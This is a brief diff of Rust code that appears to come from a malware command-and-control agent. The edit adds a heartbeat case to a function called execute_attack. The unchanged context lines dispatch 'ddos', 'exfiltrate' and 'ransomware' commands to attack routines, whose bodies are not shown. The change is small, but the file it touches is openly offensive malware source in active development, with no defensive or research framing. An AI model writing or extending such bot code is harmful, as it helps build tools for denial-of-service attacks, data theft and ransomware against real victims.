@@ -15,6 +15,7 @@ pub async fn execute_attack(
     evo_snap: &watch::Receiver<SoupSnapshot>,
 ) -> Result<String, C2Error> {
     match command.command.as_str() {
+        "__heartbeat__" => Ok(String::new()),
         "ddos" => ddos_attack(&command.args).await.map(|_| "OK".to_string()),
         "exfiltrate" => data_exfiltration(&command.args).await.map(|_| "OK".to_string()),
         "ransomware" => ransomware_attack(&command.args).await.map(|_| "OK".to_string()),
